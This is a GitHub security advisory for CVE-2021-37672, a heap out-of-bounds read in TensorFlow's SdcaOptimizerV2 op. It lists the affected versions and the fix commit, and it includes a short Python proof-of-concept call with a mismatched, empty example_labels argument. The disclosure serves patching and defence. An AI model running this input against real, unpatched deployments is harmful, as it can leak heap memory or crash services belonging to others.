# [M] Heap OOB in `SdcaOptimizerV2`

## Summary
Severity: Medium
Advisory: GHSA-5hj3-vjjf-f5m7
CVE: CVE-2021-37672
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2021-08-25
Source: https://github.com/advisories/GHSA-5hj3-vjjf-f5m7
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.3.4
- PyPI: `tensorflow` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-cpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.3.4
- PyPI: `tensorflow-gpu` — affected >=2.4.0 <2.4.3
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.1

## Details
### Impact
An attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`:

```python
import tensorflow as tf
  
tf.raw_ops.SdcaOptimizerV2(
  sparse_example_indices=[[1]],
  sparse_feature_indices=[[1]],
  sparse_feature_values=[[1.0,2.0]],
  dense_features=[[1.0]],
  example_weights=[1.0],
  example_labels=[],
  sparse_indices=[1],
  sparse_weights=[1.0],
  dense_weights=[[1.0]],
  example_state_data=[[100.0,100.0,100.0,100.0]],
  loss_type='logistic_loss',
  l1=100.0,
  l2=100.0,
  num_loss_partitions=1,
  num_inner_iterations=1,
  adaptive=True)       
``` 

The [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/sdca_internal.cc#L320-L353) does not check that the length of `example_labels` is the same as the number of examples.

### Patches
We have patched the issue in GitHub commit [a4e138660270e7599793fa438cd7b2fc2ce215a6](https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6).

The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5hj3-vjjf-f5m7
- https://nvd.nist.gov/vuln/detail/CVE-2021-37672
- https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-585.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-783.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-294.yaml
- https://github.com/tensorflow/tensorflow
